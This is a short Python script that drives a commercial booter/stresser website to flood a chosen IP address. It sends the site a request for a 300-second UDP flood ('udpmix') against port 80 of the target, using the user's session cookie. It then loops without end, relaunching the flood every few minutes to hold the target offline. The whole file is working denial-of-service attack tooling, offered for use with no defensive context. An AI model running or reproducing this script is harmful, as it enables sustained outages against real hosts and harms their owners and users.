from argparse import ArgumentParser
from requests import post
from time import sleep

def hold(uid, ip):

	print(f'{uid} holding {ip}!')

	while True:

		x = post('https://www.stressthem.to/booter?handle',
				headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple' + \
					'WebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36'},
				timeout=30,
				cookies={'UID': uid},
				json={'method_l4': 'udpmix', 'host': ip, 'port': 80, 'time': 300}
			)

		try:

			if x.json()['status'] == 1:
				#print(x.json()['message'])  # Attack has been successfully launched!
				sleep(310)

			if x.json()['status'] == 2:
				print(x.json()['message'])  # error
				sleep(30)

		except: 

			print(x.text)  # err

def main():
	parser = ArgumentParser(description='example: --uid abc-123-u-i-d --ip 127.0.0.1')
	parser.add_argument('-uid', '--uid', help='uid', required=True)
	parser.add_argument('-ip', '--ip', help='ip', required=True)
	args = parser.parse_args()

	hold(args.uid, args.ip)

if __name__ == "__main__":
	main()
